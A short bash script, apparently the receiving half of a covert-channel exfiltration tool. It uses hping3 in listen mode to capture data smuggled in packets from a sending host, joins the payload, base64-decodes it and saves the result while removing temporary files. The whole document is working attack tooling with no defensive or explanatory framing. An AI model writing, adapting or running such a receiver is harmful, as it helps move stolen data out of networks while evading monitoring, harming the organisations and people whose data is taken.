#$1 - sending IP
#$2 - signature
#$3 - interface
#$4 - plain text file to save as
#Usage: hping3 [sender ip] --listen [signature] -I [interface] > [file]
hping3 $1 --listen $2 -I $3 > ./.temp1
trap " " INT
echo "past trap"
cut -f1 -d '=' ./.temp1 | tr -d '\n' > ./.temp2 
echo -n '==' | cat ./.temp2 - > ./exfil.base64
base64 -d ./exfil.base64 > $4
rm ./.temp2 & rm ./.temp1
